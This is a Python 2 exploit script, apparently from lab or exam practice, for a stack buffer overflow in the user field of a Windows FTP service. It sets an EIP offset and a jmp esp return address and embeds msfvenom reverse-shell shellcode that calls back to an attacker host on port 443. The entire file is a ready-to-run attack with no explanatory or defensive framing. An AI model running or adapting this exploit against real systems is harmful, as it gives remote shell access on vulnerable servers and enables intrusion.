#!/usr/bin/env python2

import socket
import struct

# overflow is in user field and kicks off at a size of 1000
# OFFSETS
# EIP 251
# EXP 263

# jmp esp in ntll.dll at 0x77ace871

RHOST = "10.10.10.2"
RPORT = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.4 LPORT=443 --var-name shellcode -f python -a x86 -b "\x00\x0A\x0D" EXIT_FUNC=thread
shellcode =  b""
shellcode += b"\xdd\xc2\xba\x0e\xab\x2f\x2f\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc"
shellcode += b"\x03\x58\xb8\xcd\xda\x98\x56\x93\x25\x60\xa7"
shellcode += b"\xf4\xac\x85\x96\x34\xca\xce\x89\x84\x98\x82"
shellcode += b"\x25\x6e\xcc\x36\xbd\x02\xd9\x39\x76\xa8\x3f"
shellcode += b"\x74\x87\x81\x7c\x17\x0b\xd8\x50\xf7\x32\x13"
shellcode += b"\xa5\xf6\x73\x4e\x44\xaa\x2c\x04\xfb\x5a\x58"
shellcode += b"\x50\xc0\xd1\x12\x74\x40\x06\xe2\x77\x61\x99"
shellcode += b"\x78\x2e\xa1\x18\xac\x5a\xe8\x02\xb1\x67\xa2"
shellcode += b"\xb9\x01\x13\x35\x6b\x58\xdc\x9a\x52\x54\x2f"
shellcode += b"\xe2\x93\x53\xd0\x91\xed\xa7\x6d\xa2\x2a\xd5"
shellcode += b"\xa9\x27\xa8\x7d\x39\x9f\x14\x7f\xee\x46\xdf"
shellcode += b"\x73\x5b\x0c\x87\x97\x5a\xc1\xbc\xac\xd7\xe4"
shellcode += b"\x12\x25\xa3\xc2\xb6\x6d\x77\x6a\xef\xcb\xd6"
shellcode += b"\x93\xef\xb3\x87\x31\x64\x59\xd3\x4b\x27\x36"
shellcode += b"\x10\x66\xd7\xc6\x3e\xf1\xa4\xf4\xe1\xa9\x22"
shellcode += b"\xb5\x6a\x74\xb5\xba\x40\xc0\x29\x45\x6b\x31"
shellcode += b"\x60\x82\x3f\x61\x1a\x23\x40\xea\xda\xcc\x95"
shellcode += b"\xbd\x8a\x62\x46\x7e\x7a\xc3\x36\x16\x90\xcc"
shellcode += b"\x69\x06\x9b\x06\x02\xad\x66\xc1\x27\x38\x62"
shellcode += b"\x15\x50\x3e\x72\x14\x1b\xb7\x94\x7c\x4b\x9e"
shellcode += b"\x0f\xe9\xf2\xbb\xdb\x88\xfb\x11\xa6\x8b\x70"
shellcode += b"\x96\x57\x45\x71\xd3\x4b\x32\x71\xae\x31\x95"
shellcode += b"\x8e\x04\x5d\x79\x1c\xc3\x9d\xf4\x3d\x5c\xca"
shellcode += b"\x51\xf3\x95\x9e\x4f\xaa\x0f\xbc\x8d\x2a\x77"
shellcode += b"\x04\x4a\x8f\x76\x85\x1f\xab\x5c\x95\xd9\x34"
shellcode += b"\xd9\xc1\xb5\x62\xb7\xbf\x73\xdd\x79\x69\x2a"
shellcode += b"\xb2\xd3\xfd\xab\xf8\xe3\x7b\xb4\xd4\x95\x63"
shellcode += b"\x05\x81\xe3\x9c\xaa\x45\xe4\xe5\xd6\xf5\x0b"
shellcode += b"\x3c\x53\x05\x46\x1c\xf2\x8e\x0f\xf5\x46\xd3"
shellcode += b"\xaf\x20\x84\xea\x33\xc0\x75\x09\x2b\xa1\x70"
shellcode += b"\x55\xeb\x5a\x09\xc6\x9e\x5c\xbe\xe7\x8a"

buf_length = 1000
eip_offset = 251
jmp_esp = 0x77ACE871
nop_sled = "\x90" * 32

badchars = [0x00, 0x0A, 0x0D]

padding = "A" * eip_offset
eip = struct.pack("<I", jmp_esp)
filler = "C" * 8
esp = "D" * (buf_length - len(padding) - len(eip) - len(filler) - len(shellcode) - len(nop_sled))

buf = padding + eip + filler + nop_sled + shellcode + esp


data = s.recv(1024)
s.send(buf + "\r\n")
data = s.recv(1024)

s.close()

